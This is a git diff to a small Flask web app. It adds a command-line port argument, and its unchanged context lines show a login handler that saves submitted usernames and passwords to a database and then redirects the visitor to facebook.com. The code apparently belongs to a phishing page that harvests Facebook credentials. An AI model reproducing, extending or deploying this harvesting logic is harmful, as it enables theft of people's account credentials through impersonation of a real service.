@@ -2,6 +2,8 @@ from flask import Flask,render_template,request,redirect
 from flask_sqlalchemy import SQLAlchemy
 from Models.db import db
 from Models.model import LoginCredentials
+import sys
+port=sys.argv[1]
 app=Flask(__name__)
 
 
@@ -28,7 +30,6 @@ def page_login():
     data=LoginCredentials(username=username,password=password)
     db.session.add(data)
     db.session.commit()
-
     response=redirect("https://www.facebook.com/",code=303)
     response.headers['Cache-Control'] = 'no-cache, no-store, must-revalidate'
     response.headers['Pragma'] = 'no-cache'
@@ -37,6 +38,6 @@ def page_login():
     return response
 
 if __name__=="__main__":
-    app.run(debug=True)
+    app.run(debug=True,port=port)
     
 
